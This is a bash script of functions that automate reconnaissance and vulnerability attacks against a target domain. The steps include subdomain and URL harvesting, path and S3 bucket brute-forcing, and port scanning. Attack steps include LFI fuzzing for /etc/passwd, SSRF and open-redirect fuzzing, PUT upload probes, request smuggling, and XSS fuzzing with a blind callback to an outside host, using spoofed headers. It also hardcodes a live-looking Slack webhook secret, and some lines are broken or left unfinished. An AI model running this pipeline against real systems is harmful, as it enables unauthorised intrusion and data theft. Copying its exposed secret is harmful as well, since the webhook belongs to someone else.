####################################################################################################################################
automate-recon (){ 
OKGREEN='\033[92m'; RESET='\e[0m';

#---------------------------------------------------------------------------------------------------------------------------------#
# Enumerating subdomains + collecting urls
printf '%b\n\n\n'; echo -e "$OKGREEN Step1 : Subdomain Alteration & Permutation $RESET"
cd /root/sudomy; ./sudomy -d $1 --no-probe -o $1_sub; 
cd $1_sub/Sudomy-Output/$1; mkdir interest wordlist raws fuzz automationtesting juicyfiles; 
cat subdomain.txt | grep -F "$1" | tee subdomain.out; rm subdomain.txt;


#---------------------------------------------------------------------------------------------------------------------------------#
# Subdomain A,AAAA Resolving + IP resolved Cloudflare scan 
printf '%b\n\n\n'; echo -e "$OKGREEN Step2 : Subdomain A,AAAA,CNAME Resolving + IP resolved Cloudflare scan $RESET"

	# Subdomain A,AAAA,CNAME resolving
	cat subdomain.out | dnsprobe -r A -silent -t 500 | awk '{print $2" "$1}' | tee resolv1;
	cat subdomain.out | dnsprobe -r AAAA -silent -t 500 | awk '{print $2" "$1}' | tee resolv2;
	cat subdomain.out | dnsprobe -r CNAME -silent -t 500 | awk '{print $2" "$1}' | tee resolv3;
	sort -u resolv1 resolv2 > ipresolv.out; sort -u resolv1 resolv2 resolv3 > ./raws/subdomain-resolved; rm resolv[1-3];

	# CloudFlare scan
	cat ipresolv.out | awk '{print $1}' | cf-check | sort -u | tee cf-ipresolv.out;


#---------------------------------------------------------------------------------------------------------------------------------#
# Subdomain HTTP Probing & Status Code Checking
printf '%b\n\n\n'; echo -e "$OKGREEN Step3 : Subdomain HTTP Probing [80,443] & Status Code Checking $RESET"
cat subdomain.out | httpx -vhost -status-code -content-length -web-server -title -threads 60 -timeout 5 | sort | \
awk '{print $2" "$3 " " $1" "$4$5$6$7$8$9$10$11$12$13}' | tee httpx-raws.out; cat httpx-raws.out | awk '{print $3}' | tee httpx.out; 


#---------------------------------------------------------------------------------------------------------------------------------#
# Virtualhost Discovery from subdomain list
printf '%b\n\n\n'; echo -e "$OKGREEN Step4 : Virtualhost Discovery from Subdomain list $RESET"
cat httpx-raws.out | grep vhost | awk '{print $3}' | tee virtualhost.out


#---------------------------------------------------------------------------------------------------------------------------------#
# Get urls from subdomain
printf '%b\n\n\n'; echo -e "$OKGREEN Step5 : URL Collecting from Passive Crawling $RESET"
cat subdomain.out | gau -retries 2 | tee ./raws/allurls-temp;


#---------------------------------------------------------------------------------------------------------------------------------#
# Collecting data (url,endpoint,js,etc) from active crawling
printf '%b\n\n\n'; echo -e "$OKGREEN Step6 : URL Collecting from Active Crawling $RESET"
gospider -d 1 --sitemap --robots -c 10 -t 10 -S httpx.out \
-H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0" | \
tee tmp.txt; sort -u tmp.txt > ./raws/data-gospider; rm tmp.txt; 


#---------------------------------------------------------------------------------------------------------------------------------#
# Parsing & processing URL list (1)
printf '%b\n\n\n'; echo -e "$OKGREEN Step7 : Parsing & processing URL list (1) $RESET"
pattern1="(\?|\&)utm(_|-)(source|campaign|content|medium|term)=|\?fbclid=|\?gclid=|\?dclid=|\?mscklid=|\?zanpid=|\?gclsrc=|\?af_(ios|android)_url=|";
pattern2="\?af_force_deeplink=|\?af_banner=|\?af_web_dp=|\?is_retargeting=|\?af_(dp|esp)=|";
pattern3="pk_campaign=|piwik_campaign=|\_ga=|\?clickid=|\?Click|\?campaignid=|\?__cf_chl_(jschl|captcha)_tk__|";
pattern4="pagespeed=noscript|PageSpeed\%3Dnoscript|PageSpeed\%253Dnoscript|";
pattern5="\?_=|\,|\!|js\?vue";

# Data gau : Remove junk uri + probing
	egrep -v "${pattern1}${pattern2}${pattern3}${pattern4}${pattern5}" ./raws/allurls-temp | sort -u > tmp.txt; 
	cat tmp.txt | hakcheckurl -t 40 | awk '{print $2}' | tee ./raws/data-gau; 
	rm ./raws/allurls-temp tmp.txt;

# Data gospider : Parsing url + Remove junk uri 
	egrep "\[(url|form|robots|upload-form)\]" ./raws/data-gospider | awk '{print $5}' | \
	egrep -v "${pattern1}${pattern2}${pattern3}${pattern4}${pattern5}" | tee ./raws/data-gospider-url;

# Merger data data-gau + data-gospider-url
	sort -u ./raws/data-gospider-url ./raws/data-gau | egrep -v "${pattern1}${pattern2}${pattern3}${pattern4}${pattern5}" | \
	tee ./raws/allurls; rm ./raws/data-gospider-url;


#---------------------------------------------------------------------------------------------------------------------------------#
# Parsing & processing URL list (2) 
printf '%b\n\n\n'; echo -e "$OKGREEN Step8 : Parsing & processing URL list (2) $RESET"
ext1="\.(jpg|jpeg|png|doc|svg|pdf|ttf|eot|txt|cssx|css|gif|ico|woff|woff2|vue|js|json)|"
ext2="(eot|svg|ttf|woff|woff2|gif|css|ico|otf|ts|scss)\?"

passext1="\.(jpg|jpeg|png|doc|svg|pdf|ttf|eot|cssx|css|gif|ico|woff|woff2|js|json)|"
passext2="(eot|svg|ttf|woff|woff2|gif|css|txt|ico|otf|ts|scss)\?"
extjunk1="\.js\?ver=|\/wp\-json\/oembed|wp-content\/plugins|js\?\_|(eot|svg|ttf|woff|woff2|gif|css|ico)\?|node_module|jsessionid"

path1="\/(admin|api|auth|access|account|beta|board|bin|backup|cgi|create|checkout|debug|dashboard|deploy|dev|db|get|post|prod|pay|"
path2="purchase|panel|rest|user|member|internal|ticket|test|staging|sso|system|setting|server|staff|"
path3="java|jenkins|subscription|private|proxy|log|v[0-9]|[1-9]\.[0-9])"
junkpath1="\/wp-(json|content)\/"

junk1="\/svg|text\/(xml|html|plain|javascript|css)|";
junk2="(www\.youtube|\.google|player\.vimeo|pinterest|reddit|cdn-static-1\.medium|momentjs|googleadservices|fontawesome)\.com|";
junk3="application\/(x-www-form-urlencoded|json)|wp-(content|includes|json)|";
junk4="image\/(jpeg|png|tiff|gif)|audio\/(mpeg|mp3|mpa|mpa-robust|aac)|video\/(webm|mp4|3gp|mpeg|ogg|quicktime)|";
junk5="(africa|asia|america|australia|atlantic|europa|europe|pacific)\/|";
junk6="\/favicon\.ico|d\/(m|mm)\/y|m\/(d|dd)\/y|www\.w3\.org|google-analytics|pusher\.com|";
junk7="etc\/(gmt|utc)|";
junk8="node_modules)|";
junk9="zdassets\.com|datadoghq|googletagmanager\.com|unpkg\.com"


# Passing parameters ---> ./interest/passingparams
  grep "=" ./raws/allurls | egrep -i "${passext1}${passext2}" | egrep -v "${extjunk1}" | tee output1
  for i in $(cat output1); do URL="${i}"; LIST=(${URL//[=&]/=FUZZ&}); echo ${LIST} | awk -F '=' -vOFS='=' '{$NF="FUZZ"}1;' >> output2; done; 
  sort -u output2 | tee ./interest/passingparams; 

# Parameter list ---> ./interest/paramsuniq
  grep "=" ./raws/allurls | egrep -iv "${junk1}${ext1}${ext2}|\.htm" | tee output1; \
  for i in $(cat output1); do URL="${i}"; LIST=(${URL//[=&]/=FUZZ&}); echo ${LIST} | awk -F '=' -vOFS='=' '{$NF="FUZZ"}1;' >> output2; done; 
  sort -u output2 > output3; sed '/?/!d' output3 | tee output4; sort -u output4 ./interest/passingparams > ./interest/paramsuniq; rm output[0-9];

# Query Strings Parameter keys ---> ./interest/querystrings-keys
  cat ./raws/allurls | unfurl keypairs | sort -u | tee ./interest/querystrings-keys;

# Path > Brute
  cat raws/allurls | grep -v = | sed -e 's/\/[^\/]*$//' | sort -u | unfurl format %s://%d%p/ | tee ./interest/pathuri-temp
  sort -u httpx.out ./interest/pathuri-temp >> ./interest/pathuri; rm ./interest/pathuri-temp;

# Param > Brute
  cat interest/paramsuniq | cut -d"?" -f1 | sort -u | tee ./interest/paramsuri
  sed -i 's/$/?FUZZ/' ./interest/paramsuri

# Interest URI < ./raws/allurls
  egrep -v '${junkpath1}' ./raws/allurls | egrep "${path1}${path2}${path3}" | sort -u > ./interest/interesturi-allurls 

# Parse Interest URI, endpoint from [linfinder] < ./raws/data-gospider
  egrep "\[linkfinder\]" ./raws/data-gospider | awk '{print $4" "$6}' | \
  egrep -v "${junk1}${junk2}${junk3}${junk4}${junk5}${junk6}${junk7}${junk8}${junk9}" | sort -u | tee ./interest/interesturi-js ;


#---------------------------------------------------------------------------------------------------------------------------------#
# Colecting Juicy file 
printf '%b\n\n\n'; echo -e "$OKGREEN Step9 : Collect interesting parameter + filter query strings parameter $RESET"
filterpath="(\/cdn|wp-(content|admin|includes)\/|\?ver=|\/recaptcha|wwww\.google)|"
filter1="s3Capcha|wow\.min|jasny-bootstrap|jasny-bootstrap\.min|node_modules|";
filter2="jquery|ravenjs|static\.freshdev|"
filter3="wpgroho|polyfill\.min|bootstrap|";
filter4="myslider|modernizr|modernizr\.(min|custom)|hip";	

# Step 1
  # Javascript files : 1) Fetch js file + 2) Crawling JS files from given urls/subdomains
	# Collecting js file (1)
	egrep "\.js" ./raws/data-gau | hakcheckurl -t 40 | grep "200" | awk '{print $2}' | tee gau-js-temp; 
	egrep "\[javascript\]" ./raws/data-gospider | awk '{print $3}' | tee gospider-js-temp;

	# Other juicy files :: json, txt, toml, xml, yaml, etc : 1) Fetch other juicy file + 2) Crawling other juicy files 
	otherext="\.json|\.txt|\.yaml|\.toml|\.xml|\.config|\.tar|\.gz|\.log"
	egrep "${otherext}" ./raws/data-gau | hakcheckurl -t 40 | grep "200" | awk '{print $2}' | tee gau-other-temp; 
	egrep "\[url\]" ./raws/data-gospider | egrep "${otherext}" | awk '{print $5}' | tee gospider-other-temp;

		sort -u gau-js-temp gospider-js-temp > ./juicyfiles/allJSfiles-temp1;
		sort -u gau-other-temp gospider-other-temp > ./juicyfiles/otherfiles;

	# Delete junk js -- awk -F / '{print $NF}'
	cat ./juicyfiles/allJSfiles-temp1 | grep "\.js" | cut -d"?" -f1 | egrep -v "${filterpath}${filter1}${filter2}${filter3}${filter4}" | \
	sort -u | tee ./juicyfiles/jsfiles

rm gau-other-temp gospider-other-temp gospider-js-temp gau-js-temp;


#---------------------------------------------------------------------------------------------------------------------------------#
# Fetch travis build log
printf '%b\n\n\n'; echo -e "$OKGREEN Step10 : Fetch Travis Build Log $RESET"
echo $1 | cut -d"." -f1 | tee temp; for org in $(cat temp); do echo "$org"; done
rm temp; cd ./juicyfiles; secretz -c 10 -t $org; mv output/ travislog; cd ../;


#---------------------------------------------------------------------------------------------------------------------------------#
# Generate Wordlist
printf '%b\n\n\n'; echo -e "$OKGREEN Step11 : Generate Wordlist (Parameter & Path) $RESET"

# Parameter  
  cat ./raws/allurls | unfurl keys | tee ./wordlist/parameter-temp
  cat ./wordlist/parameter-temp | egrep -ve "\%|\." -ve "[a-zA-Z]{20,30}" | tr -d ':' | sort -u > ./wordlist/parameter; rm ./wordlist/parameter-temp;

# Path
  fil1="wp-(content|includes|json)|"
  fil2="(docs|drive)\.google|\%22|amp|sha(256|384|512)"
  cat ./interest/pathuri | egrep -v "=|${fil1}${fil2}${ext1}${ext2}" | unfurl path | sed 's#/#\n#g' | sort -u | egrep -v "[a-zA-Z]{20,40}" | tee ./wordlist/paths


#---------------------------------------------------------------------------------------------------------------------------------#
# Interesting ::gf pattern:: parameter > Deeping Vulnerable testing
# -- More gf profiles/patterns to maximize utility
printf '%b\n\n\n'; echo -e "$OKGREEN Step12 : Interesting ::gf pattern:: parameter > Deeping Vulnerable testing $RESET"
mkdir ./fuzz/temp; cp ./interest/paramsuniq ./fuzz/temp; cd ./fuzz/temp;
gf lfi | sed 's/http/\nhttp/g' | grep ^http | sed 's/\(^http[^ <]*\)\(.*\)/\1/g' | sort -u > ../fuzz-fileinclusion; 
gf redirect | sed 's/http/\nhttp/g' | grep ^http | sed 's/\(^http[^ <]*\)\(.*\)/\1/g' | sort -u > ../fuzz-openredirect;
gf sqli | sed 's/http/\nhttp/g' | grep ^http | sed 's/\(^http[^ <]*\)\(.*\)/\1/g' | sort -u > ../fuzz-sqli;
gf ssrf | sed 's/http/\nhttp/g' | grep ^http | sed 's/\(^http[^ <]*\)\(.*\)/\1/g' | sort -u > ../fuzz-ssrf;
gf idor | sed 's/http/\nhttp/g' | grep ^http | sed 's/\(^http[^ <]*\)\(.*\)/\1/g' | sort -u > ../fuzz-idor;
gf ssti | sed 's/http/\nhttp/g' | grep ^http | sed 's/\(^http[^ <]*\)\(.*\)/\1/g' | sort -u > ../fuzz-ssti;
gf rce | sed 's/http/\nhttp/g' | grep ^http | sed 's/\(^http[^ <]*\)\(.*\)/\1/g' | sort -u > ../fuzz-rce;
cd ../../; rm -rf ./fuzz/temp; 
find ./fuzz -size  0 -print -delete;


#---------------------------------------------------------------------------------------------------------------------------------#
# Webanalyze
printf '%b\n\n\n'; echo -e "$OKGREEN Step13 : Uncovers technologies from Subdomain list $RESET"
webanalyze -apps /root/resource/src/apps.json -worker 10 -hosts httpx.out -output csv | tee webanalyzes.out;


#---------------------------------------------------------------------------------------------------------------------------------#
# Favicon Hash Checking
printf '%b\n\n\n'; echo -e "$OKGREEN Step14 : Favicon Hash Checking $RESET"
sort cf-ipresolv.out httpx.out > favtemp1;
cat favtemp1 | python3 /root/tools/favfreak/favfreak.py | tee favtemp2;
cat favtemp2 | egrep -v "\~|INF|ERR" | tee ./interest/faviconhash; rm favtemp[1-2]


#---------------------------------------------------------------------------------------------------------------------------------#
# Taking screenshots
printf '%b\n\n\n'; echo -e "$OKGREEN Step15 : Taking screenshots $RESET"
mkdir screens; 
gowitness file --source subdomain.out -d ./screens;
gowitness report generate; mv report-0.html gowitness.html;


#---------------------------------------------------------------------------------------------------------------------------------#
# Copying recon result
cp -r /root/sudomy/$1_sub/Sudomy-Output/$1 /var/www/html/automate/$1
zip -r /var/www/html/automate/$1.zip /root/sudomy/$1_sub/Sudomy-Output/$1

# Slack alert 
curl -X POST -H 'Content-type: application/json' --data '{"text":"Automate Recon Done :)"}' \
https://hooks.slack.com/services/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
#---------------------------------------------------------------------------------------------------------------------------------#

}



####################################################################################################################################
automate-dnsgen(){
# Subdomain Alteration & Permutation
printf '%b\n\n\n'; echo -e "$OKGREEN Subdomain Alteration & Permutation $RESET"
cd /root/sudomy/$1_sub/Sudomy-Output/$1
cat subdomain.out | dnsgen - | tee dnsgen-temp; sort -u subdomain.out dnsgen-temp > dnsgen; 
cat dnsgen | dnsprobe -r A -silent -t 500 | tee dnsgen-A
cat dnsgen | dnsprobe -r AAAA -silent -t 500 | tee dnsgen-AAAA
cat dnsgen | dnsprobe -r CNAME -silent -t 500 | tee dnsgen-CNAME
cat dnsgen-A dnsgen-AAAA dnsgen-CNAME | awk '{print $1}' | sort -u >> dnsgen-temp.out;
awk 'FNR==NR {a[$0]++; next} !($0 in a)' subdomain.out dnsgen-temp.out | tee dnsgen.out
rm dnsgen dnsgen-temp dnsgen-A dnsgen-AAAA dnsgen-CNAME dnsgen-temp.out;

#---------------------------------------------------------------------------------------------------------------------------------#
# Copying recon result
rm -rf /var/www/html/automate/$1 /var/www/html/automate/$1.zip
cp -r /root/sudomy/$1_sub/Sudomy-Output/$1 /var/www/html/automate/$1
zip -r /var/www/html/automate/$1.zip /root/sudomy/$1_sub/Sudomy-Output/$1

curl -X POST -H 'Content-type: application/json' --data '{"text":"Automate Subdomain Alteration & Permutation Done :)"}' \
https://hooks.slack.com/services/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
}



####################################################################################################################################
automate-portscan(){
printf '%b\n\n\n'; echo -e "$OKGREEN Active Port Scanning $RESET"
cd /root/sudomy/$1_sub/Sudomy-Output/$1

# Port scan subdomains
printf '%b\n\n\n'; echo -e "$OKGREEN Step1.1 : Subdomain Port Scan Common Port $RESET"	
cat raws/subdomain-resolved | awk '{print $2}' | sort -u | httpx -vhost -threads 30 -silent -ports 4443,8000-8099,8880,8888,8443,9200 | \
tee httpx-9999.out; rm temp temp2 resolv[0-9];

# Port scan ip 
printf '%b\n\n\n'; echo -e "$OKGREEN Step1.2 : IP lis Port Scan Full Port $RESET"
naabu -t 10 -hL cf-ipresolv.out -ports full -exclude-ports 1-200 -retries 3 | tee openport.out;

#---------------------------------------------------------------------------------------------------------------------------------#
# Copying result
rm -rf /var/www/html/automate/$1 /var/www/html/automate/$1.zip
cp -r /root/sudomy/$1_sub/Sudomy-Output/$1 /var/www/html/automate/$1
zip -r /var/www/html/automate/$1.zip /root/sudomy/$1_sub/Sudomy-Output/$1
curl -X POST -H 'Content-type: application/json' --data '{"text":"Automate Port Scanning Done :)"}' \
https://hooks.slack.com/services/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
}




####################################################################################################################################
automate-download(){
# Workdir : $1_sub/Sudomy-Output/$1;
cd /root/sudomy/$1_sub/Sudomy-Output/$1
mkdir ./juicyfiles/download ./juicyfiles/download/js ./juicyfiles/download/js2 \
./juicyfiles/download/other ./juicyfiles/download/node_module


printf '%b\n\n\n'; echo -e "$OKGREEN Step1 : Downloading juicy files $RESET"
# Step 1.1 - Colecting js file (1)
  # Downloading juicy files
	cat ./juicyfiles/jsfiles | parallel -j 5 wget --force-directories -c -P ./juicyfiles/download/js --no-check-certificate;
	cat ./juicyfiles/otherfiles | parallel -j 5 wget --force-directories -c -P ./juicyfiles/download/other --no-check-certificate;

# Step 1.2 - Colecting js file (2)
	gf urls ./juicyfiles/ | egrep -v "\.json" | egrep "\.js" | cut -d"?" -f1 | \
	egrep -v "${junk1}${junk2}${junk3}${junk4}${junk5}${junk6}${junk7}${junk8}${junk9}${filterpath}${filter1}${filter2}${filter3}${filter4}" | \
	sort -u | egrep "\.js$" | tee ./juicyfiles/jsfiles2; 

	# Downloading
	cat ./juicyfiles/jsfiles2 | parallel -j 5 wget --force-directories -c -P ./juicyfiles/download/js2 --no-check-certificate;

# Step 1.3 
	# Collecting js file from /node_module
	cat ./juicyfiles/allJSfiles-temp1 | grep "node_module" | tee ./juicyfiles/node_module;

	# Downloading
	cat ./juicyfiles/node_module | parallel -j 5 wget --force-directories -c -P ./juicyfiles/download/node_module --no-check-certificate;

rm ./juicyfiles/allJSfiles-temp1;


#---------------------------------------------------------------------------------------------------------------------------------#
# Minify, re-indent bookmarklet unpack, deobuscate JS files
printf '%b\n\n\n'; echo -e "$OKGREEN Step2 : Minifying JS files $RESET"
find ./juicyfiles/download/ -type f -name "*.js" -exec js-beautify -r {} \;


#---------------------------------------------------------------------------------------------------------------------------------#
printf '%b\n\n\n'; echo -e "$OKGREEN Step3 : Collecting parameter & path $RESET"

# Collecting potential parameter from variable JS Files
	unbuffer egrep -r "var [a-zA-Z0-9_]+" --color=yes ./juicyfiles/download/js/ ./juicyfiles/download/js2/ | \
	sed -e 's, 'var','"$url"?',g' -e 's/ //g' | tee ./interest/variablefromjs

# Collecting potential wordlist from variable JS Files
	grep -roh "\"\/[a-zA-Z0-9_?&=/\-\#]*\"" ./juicyfiles/download/js* | sed -e 's/^"//' -e 's/"$//' | sort -u > ./wordlist/js-paths


#---------------------------------------------------------------------------------------------------------------------------------#
# Copying result
rm -rf /var/www/html/automate/$1 /var/www/html/automate/$1.zip
cp -r /root/sudomy/$1_sub/Sudomy-Output/$1 /var/www/html/automate/$1
zip -r /var/www/html/automate/$1.zip /root/sudomy/$1_sub/Sudomy-Output/$1
curl -X POST -H 'Content-type: application/json' --data '{"text":"Automate Download Done :)"}' \
https://hooks.slack.com/services/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
}



####################################################################################################################################
automate-brute (){
# Workdir : $1_sub/Sudomy-Output/$1;
cd /root/sudomy/$1_sub/Sudomy-Output/$1
mkdir brute;

# Dir/path
	# Vhost internal path
	printf '%b\n\n\n'; echo -e "$OKGREEN Step1.1 - Bruteforce Vhost Internal Path $RESET"
	for i in $(cat virtualhost.out); do  ffuf -u $i/FUZZ -w /root/resource/wordlist/dir/internalpath.txt \
	-H "User-Agent: Mozilla/5.0 Windows NT 10.0 Win64 AppleWebKit/537.36 Chrome/69.0.3497.100" -H "X-Forwarded-For: 127.0.0.1" \
	-H "Host: localhost" -c -fs 0 -t 10 -mc 200 -recursion ; done | tee ahaaaa; 
	cat ahaaaa | egrep -v "Method|Header|Follow|Calib|Timeout|Thread|Matc|Filt|v1|_|^$" | tee ./brute/internalpath; rm ahaaaa;	

	# Sort wordlist
	printf '%b\n\n\n'; echo -e "$OKGREEN Step1.2 - Bruteforce Sort Wordlist $RESET"
	for i in $(cat ./interest/pathuri); do  ffuf -u $i/FUZZ -w /root/resource/wordlist/dir/short-wordlist.txt \
	-H "User-Agent: Mozilla/5.0 Windows NT 10.0 Win64 AppleWebKit/537.36 Chrome/69.0.3497.100" -H "X-Forwarded-For: 127.0.0.1" \
	-c -fs 0 -t 10 -mc 200 -recursion ; done | tee ahaaaa; 
	cat ahaaaa | egrep -v "Method|Header|Follow|Calib|Timeout|Thread|Matc|Filt|v1|_|^$" | tee ./brute/sortwordlist; rm ahaaaa;

	# Spring boot
	printf '%b\n\n\n'; echo -e "$OKGREEN Step1.3 - Bruteforce Springboot Wordlist $RESET"
	for i in $(cat ./interest/pathuri); do  ffuf -u $i/FUZZ -w /root/resource/wordlist/dir/spring-boot.txt \
	-H "User-Agent: Mozilla/5.0 Windows NT 10.0 Win64 AppleWebKit/537.36 Chrome/69.0.3497.100" -H "X-Forwarded-For: 127.0.0.1" \
	-c -fs 0 -t 10 -mc 200 -recursion ; done | tee bbbbb; 
	cat bbbbb | egrep -v "Method|Header|Follow|Calib|Timeout|Thread|Matc|Filt|v1|_|^$" | tee ./brute/springboot; rm bbbbb;

	# Big Wordlist
	printf '%b\n\n\n'; echo -e "$OKGREEN Step1.4 - Bruteforce Big Wordlist $RESET"
	for i in $(cat httpx.out); do  ffuf -u $i/FUZZ -w /root/resource/wordlist/dir/big-wordlist.txt \
	-H "User-Agent: Mozilla/5.0 Windows NT 10.0 Win64 AppleWebKit/537.36 Chrome/69.0.3497.100" -H "X-Forwarded-For: 127.0.0.1" \
	-c -fs 0 -t 10 -mc 200 -recursion ; done | tee xxxxx; 
	cat xxxxx | egrep -v "Method|Header|Follow|Calib|Timeout|Thread|Matc|Filt|v1|_|^$" | tee ./brute/bigwordlist; rm xxxxx;


# Parameter
printf '%b\n\n\n'; echo -e "$OKGREEN Step2 - Parameter Discovery $RESET"
python3 /root/tools/arjun/arjun.py --urls ./interest/paramsuri -f ./wordlist/parameter -t 15 -o ./brute/parameter1
python3 /root/tools/arjun/arjun.py --urls ./interest/paramsuri -f /root/resource/wordlist/params.txt -t 15 -o ./brute/parameter2


#---------------------------------------------------------------------------------------------------------------------------------#
# Copying result
rm -rf /var/www/html/automate/$1 /var/www/html/automate/$1.zip
cp -r /root/sudomy/$1_sub/Sudomy-Output/$1 /var/www/html/automate/$1
zip -r /var/www/html/automate/$1.zip /root/sudomy/$1_sub/Sudomy-Output/$1
curl -X POST -H 'Content-type: application/json' --data '{"text":"Automate Bruteforce Done :)"}' \
https://hooks.slack.com/services/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
}


####################################################################################################################################
automate-s3discovery(){
# Workdir : $1_sub/Sudomy-Output/$1;
printf '%b\n\n\n'; echo -e "$OKGREEN S3 Bucket Discovery $RESET"
cd /root/sudomy/$1_sub/Sudomy-Output/$1


# From $1_sub/Sudomy-Output/$1
	gf s3-buckets | sort -u | tee ./automationtesting/s3bucket-all;

# Bruteforce 
echo ".s3.amazonaws.com" >> ./wordlist/domain-temp; 

	# Wordlist /resource/wordlist/s3cbucket
	s3enum --wordlist /root/resource/wordlist/s3bucket/prefixlist.txt --suffixlist /root/resource/wordlist/s3bucket/suffixlist.txt \
	--threads 15 $1 | tee ./wordlist/s3bucketnames-temp1;	
	comb ./wordlist/s3bucketnames-temp1 ./wordlist/domain-temp >> ./wordlist/s3bucketnames-temp1;
	
	# Wordlist from subdomains name
	cat subdomain.out | cut -d "." -f1 | tee prefix-s3-temp;
	s3enum --wordlist prefix-s3-temp; --suffixlist /root/resource/wordlist/s3bucket/suffixlist.txt \
	--threads 15 $1 | tee ./wordlist/s3bucketnames-temp2;	
	comb ./wordlist/s3bucketnames-temp2 ./wordlist/domain-temp >> ./wordlist/s3bucketnames-temp2;
	
		sort -u ./wordlist/s3bucketnames-temp1 ./wordlist/s3bucketnames-temp2 > ./wordlist/s3bucketnames-temp
		cat ./wordlist/s3bucketnames-temp | egrep -v "(-|_)\." | tee ./wordlist/s3bucketnames;
		rm ./wordlist/s3bucketnames-temp[1-2] ./wordlist/domain-temp

		cat ./wordlist/s3bucketnames | httpx -status-code -threads 40 -timeout 5 | egrep '200|403' | awk '{print $1}' | \
		sed 's/https\?:\/\///' | tee ./automationtesting/s3bucket-brute;

#---------------------------------------------------------------------------------------------------------------------------------#
# Copying result
rm -rf /var/www/html/automate/$1 /var/www/html/automate/$1.zip
cp -r /root/sudomy/$1_sub/Sudomy-Output/$1 /var/www/html/automate/$1
zip -r /var/www/html/automate/$1.zip /root/sudomy/$1_sub/Sudomy-Output/$1
curl -X POST -H 'Content-type: application/json' --data '{"text":"Automate S3 Bucket Discovery Done :)"}' \
https://hooks.slack.com/services/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

}


####################################################################################################################################
automate-testing (){ 
# Workdir : $1_sub/Sudomy-Output/$1;
cd /root/sudomy/$1_sub/Sudomy-Output/$1

#---------------------------------------------------------------------------------------------------------------------------------#
# Discovery Sensitive Data Exposure : Scanning juice files
printf '%b\n\n\n'; echo -e "$OKGREEN Step1 - Discovery Sensitive Data Exposure : Scanning juice files $RESET"
unbuffer gf sensitive-generic1 ./juicyfiles/download/ | tee ./automationtesting/sensitivedata-generic1;
unbuffer gf sensitive-generic2 ./juicyfiles/download/ | tee ./automationtesting/sensitivedata-generic2;
unbuffer gf sensitive ./juicyfiles/download/ | tee ./automationtesting/sensitivedata;


#---------------------------------------------------------------------------------------------------------------------------------#
# Subdomain Takeover: Subdomain > CNAME resolv > NXDOMAIN | Pattern matching
printf '%b\n\n\n'; echo -e "$OKGREEN Step2 - Subdomain Takeover $RESET"
dnsprobe -l subdomain.out -r CNAME -o $1_dnsprobe_cnames -silent; 
cat $1_dnsprobe_cnames | awk '{print $1}' >> $1_cnames; rm $1_dnsprobe_cnames;

parallel -j 20 host {1} {2} :::: $1_cnames ::: 8.8.8.8 1.1.1.1 8.8.4.4 | tee takeover-dnslookup;
cat takeover-dnslookup | grep "NXDOMAIN" | awk '{print $2" "$7}' | tee ./automationtesting/takeover-nxdomain; 
rm takeover-dnslookup;

subjack -w $1_cnames -timeout 30 -ssl -o subjack-results -c /root/resource/src/subjack-fingerprints.json -v 3; 
cat subjack-results | awk '$0 !~ /Not Vulnerable/' | tee ./automationtesting/takeover-subjack; rm subjack-results;


#---------------------------------------------------------------------------------------------------------------------------------#
# CVEs/Advisories
printf '%b\n\n\n'; echo -e "$OKGREEN Step3 - CVEs/Advisories Scanning $RESET"
nuclei -t /root/resource/nuclei-templates/cves/CVE-2018-1000129.yaml -l httpx.out -c 40 -silent -o ./automationtesting/CVE-2018-1000129
nuclei -t /root/resource/nuclei-templates/cves/CVE-2020-5410.yaml -l httpx.out -c 40 -silent -o ./automationtesting/CVE-2020-5410
nuclei -t /root/resource/nuclei-templates/cves/ springboot-actuators-jolokia-xxe.yaml -l httpx.out -c 40 -silent -o ./automationtesting/RCE-Jolokia


#---------------------------------------------------------------------------------------------------------------------------------#
# HTTP Request Smuggling / Desync
printf '%b\n\n\n'; echo -e "$OKGREEN Step4 - HTTP Request Smuggling / Desync $RESET"
cat httpx.out | smuggler | tee ./automationtesting/httpsmuggler-vuln;


#---------------------------------------------------------------------------------------------------------------------------------#
# CORS Misconfig
printf '%b\n\n\n'; echo -e "$OKGREEN Step5 - CORS Misconfig Scan $RESET"
cat httpx.out | CORS-Scanner -o "google.com" | tee ./automationtesting/cors-vuln;


#---------------------------------------------------------------------------------------------------------------------------------#
# Unrestricted PUT method 
printf '%b\n\n\n'; echo -e "$OKGREEN Step6 - Unrestricted PUT method $RESET"
echo "a" > put.txt; cp httpx.out hosts;
meg --header "User-Agent: Chrome/70.0.3538.77 Safari/537.36" -d 3000 -c 50 -X PUT /put.txt;
cat ./out/index | grep "200" | tee ./automationtesting/unrestricted-putMethod;
rm -rf ./out put.txt hosts;


#---------------------------------------------------------------------------------------------------------------------------------#
# Open Redirect & Blind SSRF
printf '%b\n\n\n'; echo -e "$OKGREEN Step7 - Open Redirect & Blind SSRF $RESET"
cp /root/resource/src/oobserver .; sed -i "s/target/$1/g" oobserver; target=./fuzz/fuzz-ssrf;
ffuf -w "$target:URL" -w oobserver -u URLFUZZ \
-H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0" -H "X-Forwarded-For: 127.0.0.1" -mc 301,302 | \
tee openredirect-vuln;


#---------------------------------------------------------------------------------------------------------------------------------#
# File Inclusion
printf '%b\n\n\n'; echo -e "$OKGREEN Step8 - File Inclusion $RESET"
target=./fuzz/fuzz-fileinclusion
ffuf -w "$target:URL" -w /root/resource/payload/lfi-etcpasswd -u URLFUZZ \
-H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:77.0) Gecko/20100101 Firefox/77.0" -H "X-Forwarded-For: 127.0.0.1" \
-mc 200 -o fileinclusion-temp1

gron fileinclusion-temp1 | tee fileinclusion-temp2
cat fileinclusion-temp2 | egrep -v "input |position|redirectlocation|resultfile|status| \{\}|url |lines|words|time|config|commandline" | \
tee ./automationtesting/fileinclusion-vuln
sed -e 's/json.results//g; s/;//g; ; s/"//g; s/input.//g; s/.URL =/\tUrl    =/g; s/.FUZZ =/\tFuzz   =/g; s/.length =/\tLength =/g' \
-i ./automationtesting/fileinclusion-vuln; rm fileinclusion-temp[1-2];


#---------------------------------------------------------------------------------------------------------------------------------#
# XSS Fuzzing [Reflected + Blind] -- kxss test special characters <"'>
printf '%b\n\n\n'; echo -e "$OKGREEN Step9 - XSS $RESET"
BLIND="https://missme3f.xss.ht"
cat ./interest/paramsuniq | kxss | tee ./automationtesting/xss-kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | \
sort -u | dalfox -w 50 pipe -b $BLIND -o ./automationtesting/xss-reflected; # dalfox --custom-payload <payloads.txt>


